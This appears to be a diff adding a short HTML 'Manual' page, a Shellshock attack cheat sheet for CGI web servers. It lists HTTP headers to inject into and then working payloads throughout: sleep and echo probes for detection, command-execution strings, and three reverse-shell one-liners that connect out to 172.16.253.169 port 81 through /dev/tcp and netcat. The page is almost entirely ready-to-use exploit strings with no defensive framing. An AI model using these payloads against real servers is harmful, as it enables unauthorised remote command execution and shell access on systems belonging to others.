@@ -1,0 +1,27 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Manual</title>
+</head><body><b>Inject payload to HTTP headers<br/>
+<br/>
+</b><tt>User-agent </tt>(Mainly this one because it becomes environment variable for cgi script)<tt><br/>
+</tt><tt>Cookies<br/>
+Referer<br/>
+</tt><tt>Accept-Language</tt><br/>
+<tt><br/>
+</tt><b>Detection<br/>
+</b><tt><br/>
+() { :;}; /bin/sleep 11<br/>
+() { :;}; echo &quot;AAAAAAAAAAAAAAAA&quot;<br/>
+<br/>
+</tt><b>Running commands<br/>
+</b><br/>
+<tt>() { :;}; echo &quot;AAAAAAAAAAAAAAAA&quot; $(/bin/sh -c &quot;/sbin/ifconfig&quot;)<br/>
+env x='() { :;}; echo vulnerable' /bin/bash -c ls<br/>
+<br/>
+</tt><b>Reverse shells<br/>
+</b><tt><br/>
+() { :;}; /bin/bash -c bash -i &gt;&amp; /dev/tcp/172.16.253.169/81 0&gt;&amp;1<br/>
+() { :;}; /bin/sh -c &quot;nc -nv 172.16.253.169 81 -e /bin/bash&quot;<br/>
+() { :;}; echo &quot;AAAAAAAAAAAAA&quot; $(/bin/sh -c &quot;nc -e /bin/bash 172.16.253.169 81&quot;)<br/>
+</tt></body></html>
